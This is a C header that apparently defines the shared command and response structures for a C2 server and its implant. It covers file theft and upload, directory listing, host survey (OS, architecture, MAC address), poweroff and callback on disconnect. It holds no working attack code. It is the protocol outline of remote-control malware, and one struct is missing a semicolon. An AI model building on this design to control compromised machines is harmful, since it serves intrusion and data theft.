#ifndef COMMON_HEADER_H
#define COMMON_HEADER_H

// Patrick Sacchet
// Define common structs and functions across C2 and implant

#include <stdint.h>


///////////////////////////////////////////
//              Commands                 //
///////////////////////////////////////////

// All possible commands we could get from our C2
typedef enum Commands
{
    disconnect = 0,
    poweroff,
    getfile,
    putfile,
    dirlist,
    survey
} Commands;

typedef struct DisconnectCommand
{
    uint32_t sleep; // how long to sleep before calling back out (0 to just exit)
    uint32_t callbackport; // which port we should reach out to once our sleep has elapsed
} DisconnectCommand;

// Dont need to send any details for a shutdown command

typedef struct GetFileCommand
{
    char filepath [1024]; // path to the file we are getting
} GetFileCommand; 

typedef struct PutFileCommand
{
    char* filepath; // path to where we are writing the file
    char* filebytes; // buffer containing contents of the file 
} PutFileCommand;

typedef struct DirListCommand
{
    char* dirpath; // path to the directory we are performing a dirlist on 
} DirListCommand;

// Dont neede to send any details for a dir list command

// Each command has a structure we are parsing 
typedef struct Command
{
    enum Commands command;

    // Depending on the command type for this message will determine which command's data we parse
    union 
    {
        DisconnectCommand disconnectcommand;

        GetFileCommand getfilecommand;

        PutFileCommand putfilecommand;

        DirListCommand dirlistcommand;
    };
    
} Command;

///////////////////////////////////////////
//              Responses                //
///////////////////////////////////////////

// No response for disconnect really needed...

// No response for shutdown really needed...

typedef struct GetFileResponse
{
    uint64_t filesize; // how large is the file we read
    char filebytes [1024]; // contents of file we got
} GetFileResponse; 

typedef struct PutFileResponse
{
    uint64_t bytesWritten // how many bytes did we end up writing to target
} PutFileResponse;

typedef struct DirListResponse
{
    char* dirs; // list of all the dirs we retrieved
} DirListResponse;

typedef struct SurveyResponse
{
    char osName [50];
    char osRelease [50];
    char osVersion [50];
    char arch [50];
    char mac [50];

} SurveyResponse;

// Each command has a response we are sending back
typedef struct Response
{
    enum Commands response;

    union 
    {
        GetFileResponse getfileresponse;

        PutFileResponse putfileresponse;

        DirListResponse dirlistresponse;

        SurveyResponse surveyresponse;
    };
    
} Response;


#endif